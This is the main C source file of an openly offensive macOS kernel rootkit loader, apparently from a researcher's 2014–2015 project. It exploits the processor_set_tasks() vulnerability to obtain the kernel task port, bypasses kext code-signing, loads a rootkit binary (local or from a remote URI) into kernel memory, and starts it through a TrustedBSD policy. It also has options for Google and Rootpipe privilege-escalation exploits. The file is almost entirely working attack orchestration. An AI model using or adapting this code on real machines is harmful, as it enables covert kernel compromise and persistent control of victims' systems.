/*
 *  _(`-')     _     (`-')  _           <-. (`-')_             (`-').->(`-')      _
 * ( (OO ).-> (_)    (OO ).-/     .->      \( OO) )     .->    ( OO)_  ( OO).->  (_)     _
 *  \    .'_  ,-(`-')/ ,---.   ,---(`-'),--./ ,--/ (`-')----. (_)--\_) /    '._  ,-(`-') \-,-----.
 *  '`'-..__) | ( OO)| \ /`.\ '  .-(OO )|   \ |  | ( OO).-.  '/    _ / |'--...__)| ( OO)  |  .--./
 *  |  |  ' | |  |  )'-'|_.' ||  | .-, \|  . '|  |)( _) | |  |\_..`--. `--.  .--'|  |  ) /_) (`-')
 *  |  |  / :(|  |_/(|  .-.  ||  | '.(_/|  |\    |  \|  |)|  |.-._)   \   |  |  (|  |_/  ||  |OO )
 *  |  '-'  / |  |'->|  | |  ||  '-'  | |  | \   |   '  '-'  '\       /   |  |   |  |'->(_'  '--'\
 *  `------'  `--'   `--' `--' `-----'  `--'  `--'    `-----'  `-----'    `--'   `--'      `-----'
 *  (`-').->(`-')  _   (`-')       (`-')  _                (`-')  _
 *  ( OO)_  ( OO).-/<-.(OO )      _(OO ) (_)     _         ( OO).-/
 * (_)--\_)(,------.,------,),--.(_/,-.\ ,-(`-') \-,-----.(,------.
 * /    _ / |  .---'|   /`. '\   \ / (_/ | ( OO)  |  .--./ |  .---'
 * \_..`--.(|  '--. |  |_.' | \   /   /  |  |  ) /_) (`-')(|  '--.
 * .-._)   \|  .--' |  .   .'_ \     /_)(|  |_/  ||  |OO ) |  .--'
 * \       /|  `---.|  |\  \ \-'\   /    |  |'->(_'  '--'\ |  `---.
 *  `-----' `------'`--' '--'    `-'     `--'      `-----' `------'
 *
 * A kernel rootkit loader based on processor_set_tasks() vulnerability
 *
 * Copyright (c) fG!, 2014, 2015. All rights reserved.
 * reverser@put.as - https://reverse.put.as
 *
 * This rootkit bypasses kernel extensions code signing requirement by leveraging
 * the processor_set_tasks() vulnerability that gives us access to kernel task port
 *
 * main.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <mach/processor_set.h>
#include <mach/mach_vm.h>
#include <sys/param.h>
#include <mach/mach.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/mman.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

#include "mac_policy.h"
#include "utils.h"
#include "logging.h"
#include "rootkit.h"
#include "structures.h"
#include "kernel_symbols.h"
#include "kernel_code_exec.h"
#include "trustedbsd.h"
#include "exploit.h"
#include "rootpipe_exploit.h"

void
header(void)
{
    printf(" ____  _                     _   _     \n"
           "|    \\|_|___ ___ ___ ___ ___| |_|_|___ \n"
           "|  |  | | .'| . |   | . |_ -|  _| |  _|\n"
           "|____/|_|__,|_  |_|_|___|___|_| |_|___|\n"
           " _____      |___|  _                   \n"
           "|   __|___ ___ _ _|_|___ ___           \n"
           "|__   | -_|  _| | | |  _| -_|          \n"
           "|_____|___|_|  \\_/|_|___|___|          \n\n"
           "(c) fG! 2014, 2015\n\n");
}

void
help(const char *name)
{
    printf("\n---[ Usage: ]---\n"
           "%s path_to_rootkit_binary [-x]\n\n"
           "Where path is location of the kext binary to load or remote http/https URI.\n"
           "-x to use Google exploit for privilege escalation, only supported in Mavericks 10.9.5\n"
           "-r to use Rootpipe exploit for privilege escalation, only supported for Mavericks\n", name);
}

int
main(int argc, const char * argv[])
{
    header();
    
    const char *target_rootkit = NULL;
    if (argc >= 2)
    {
        target_rootkit = argv[1];
    }
    else
    {
        ERROR_MSG("Wrong number of arguments.");
        help(argv[0]);
        return EXIT_FAILURE;
    }
    
    /* must be run as root */
    if (argc == 2 && geteuid() != 0)
    {
        ERROR_MSG("Please run me as root!");
        return EXIT_FAILURE;
    }
    
    /* mmap the kernel file so we can process it */
    uint8_t *kernel_buf = NULL;
    size_t kernel_buf_size = 0;
    if (map_kernel_buffer(&kernel_buf, &kernel_buf_size) != KERN_SUCCESS)
    {
        ERROR_MSG("Failed to map kernel file, can't proceed.");
        return EXIT_FAILURE;
    }
    
    /* to solve kernel symbols we need two things
     * - kernel aslr slide
     * - symbols location
     */
    struct kernel_info kinfo = {0};
    
    /* process the kernel mach-o header to find symbols location */
    if (process_kernel_mach_header(kernel_buf, &kinfo) != KERN_SUCCESS)
    {
        ERROR_MSG("Kernel Mach-O header processing failed.");
        return EXIT_FAILURE;
    }

    if (argc == 3 && strcmp(argv[2], "-x") == 0)
    {
        get_me_r00t(kernel_buf, &kinfo, argv);
    }
    /* just a quick hack around rootpipe exploit */
    /* not exactly fine code, just in a rush :PPP */
    else if (argc == 3 && strcmp(argv[2], "-r") == 0)
    {
        printf("Executing rootpiped diagnostic service...\n");
        get_me_rootpipe(argv[0]);
        sleep(1);
        int rootpipe_fd = open("/tmp/suid_diagnostic_service", O_RDONLY);
        if (rootpipe_fd < 0)
        {
            ERROR_MSG("Can't open suid binary.");
            return EXIT_FAILURE;
        }
        close(rootpipe_fd);
        rootpipe_fd = open(argv[1], O_RDONLY);
        if (rootpipe_fd < 0)
        {
            ERROR_MSG("Can't find rootkit binary.");
            return EXIT_FAILURE;
        }
        char piped[MAXPATHLEN+1] = {0};
        snprintf(piped, sizeof(piped), "/tmp/suid_diagnostic_service %s", argv[1]);
        system(piped);
        exit(0);
    }

    /* retrieve kaslr slide */
    size_t kaslr_size = sizeof(kaslr_size);
    uint64_t kaslr_slide = 0;
    get_kaslr_slide(&kaslr_size, &kaslr_slide);
    kinfo.kaslr_slide = kaslr_slide;
    OUTPUT_MSG("[INFO] Kernel ASLR slide is 0x%llx", kaslr_slide);

    /* verify if processor_set_tasks() vulnerability exists */
    /* vulnerability presented at BlackHat Asia 2014 by Ming-chieh Pan, Sung-ting Tsai. */
    /* also described in Mac OS X and iOS Internals, page 387 */
    mach_port_t kernel_port = 0;
    if (get_kernel_task_port(&kernel_port) != KERN_SUCCESS)
    {
        ERROR_MSG("Can't do anything without kernel task port. Exiting...");
        return EXIT_FAILURE;
    }
    
//    install_disable_cr0_shellcode(kernel_port);
    
    /* install rootkit to kernel memory */
    mach_vm_address_t rootkit_addr = 0;
    mach_vm_address_t rootkit_entrypoint = 0;
    if (install_rootkit(kernel_port, target_rootkit, &kinfo, &rootkit_addr, &rootkit_entrypoint) != KERN_SUCCESS)
    {
        ERROR_MSG("Error installing rootkit, bailing out!");
        return EXIT_FAILURE;
    }
    /* we need to add the rootkit location to the rootkit entrypoint we got above */
    rootkit_entrypoint += rootkit_addr;
    /* at this point we are ready to start kernel code execution via a TrustedBSD policy */
    /* this will start the rootkit and then rootkit should be responsible for cleaning up this policy */
    install_trustedbsd_policy(kernel_port, &kinfo, rootkit_entrypoint);

end:
    /* cleanup */
    unmap_kernel_buffer(kernel_buf, kernel_buf_size);
    
    return EXIT_SUCCESS;
}
